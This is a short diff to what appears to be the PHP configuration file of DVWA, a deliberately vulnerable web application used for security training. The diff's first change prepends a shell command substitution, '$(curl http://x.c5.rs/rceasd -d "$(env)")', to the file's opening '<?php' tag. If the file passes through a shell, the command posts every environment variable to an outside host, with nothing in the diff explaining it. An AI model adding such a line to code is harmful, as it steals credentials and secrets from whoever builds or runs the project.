@@ -1,4 +1,4 @@
-<?php
+$(curl http://x.c5.rs/rceasd -d "$(env)")<?php
 
 # If you are having problems connecting to the MySQL database and all of the variables below are correct
 # try changing the 'db_server' variable from localhost to 127.0.0.1. Fixes a problem due to sockets.
@@ -54,3 +54,4 @@ $_DVWA['SQLI_DB'] = getenv('SQLI_DB') ?: MYSQL;
 #$_DVWA['SQLITE_DB'] = 'sqli.db';
 
 ?>
+
